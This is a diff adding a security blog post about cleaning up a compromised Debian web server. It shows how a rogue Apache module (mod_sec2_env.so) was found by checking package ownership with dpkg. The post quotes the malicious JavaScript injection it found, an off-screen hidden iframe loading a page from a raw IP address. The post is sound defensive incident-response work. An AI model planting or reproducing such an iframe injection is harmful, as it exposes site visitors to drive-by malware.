@@ -1,0 +1,97 @@
+Web Server Compromise – Debian Distro – Identify and Remove Corrupt Apache Modules
+
+Came across another server compromise this week. Client was complaining that the following kept being injected into their JavaScript files:
+
+document.write("<style.vb4brk { position:absolute; left:-1655px; top:-1476px} </style>
+<div class="vb4rk"><iframe
+src="httx:// 149.47.154.253/fee1f3119b234cb79f953e92281b12af/q.php" width="231" height="330">
+</iframe></div>'); /*!
+
+Fortunately, the client was working off a VPS. Doing so allowed us to dig deeper into the server and better address the issue. Looking at the server we quickly realized that a bad module had been injected. Unfortunately, because this was a Debian distribution, as such you can’t run the commands we provided in our last post.
+
+Become Oriented
+If you work on various NIX distributions you’ll always want to get your orientation. What OS are you working with? How’s it configured? Every box is different so take a few minutes up front and get your baseline, will work wonders as you continue your investigation.
+Check your version:
+
+# cat /proc/version
+
+- or -
+
+cat /etc/*-release
+
+In my case, the version worked:
+
+# cat /proc/version
+Linux version 2.6.26-2-amd64 (Debian 2.6.26-25lenny1) (dannf@debian.org) ...
+httpd, you'll have to look for apache2. And to see the compiled modules you'll want to leverage this:
+
+# apache2 -l
+
+Sample output:
+
+Compiled in modules:
+core.c
+mod_log_config.c
+mod_logio.c
+prefork.c
+http_core.c
+mod_so.c
+
+To identify what modules are being loaded you'll run this:
+
+# apache2ctl -M
+
+Sample output:
+
+Loaded Modules:
+core_module (static)
+log_config_module (static)
+logio_module (static)
+mpm_prefork_module (static)
+http_module (static)
+........
+
+Now Find and Remove
+The easiest way to identify whether your Apache install has been configured on your Debian distro is to identify where the apache modules are being loaded from, then check their ownership.
+
+# grep -r ".so" /path/to/your/Apache/install/
+
+This would provide you a list of all the modules and where they are being loaded from, something like this:
+
+# grep -r ".so" .
+./mods-available/file_cache.load:LoadModule file_cache_module /usr/lib/apache2/modules/mod_file_cache.so
+./mods-available/usertrack.load:LoadModule usertrack_module /usr/lib/apache2/modules/mod_usertrack.so
+etc ...
+
+You should notice the location here:
+
+/usr/lib/apache2/modules/
+
+You also want to know that there are two different directories in the Apache install:
+
+/etc/apache2/mods-available/
+
+and
+
+/etc/apache2/mods-enabled/
+
+The names give it away. But don't be fooled, that won't serve you much good when looking for a bad module. A more effective approach will be to run dpkg in the modules directory. This is similar to our recommendation in the last post of using rpm to identify which packages own the modules:
+
+# dpkg -S /usr/lib/apache2/modules/*
+
+If you check the man page for dpkg you'll see that the S option is good to identify the ownership:
+
+-S|--search  ...        Find package(s) owning file(s).
+
+Running that you would likely see something like this:
+
+dpkg: /usr/lib/apache2/modules/mod_sec2_env.so not found.
+
+And yes, that is the bad module: mod_sec2_env.so
+Remove the module and that should get you back up and going. FYI, if you would have focused solely on the /mod-available or /mods-enabled directories you would have missed this as the module referencing the bad one was legitimate:
+
+./mods-available/include.load
+
+Cheers.
+
+If you find yourself with similar issues, or think you are suffering a compromise please send us a note info@sucuri.net
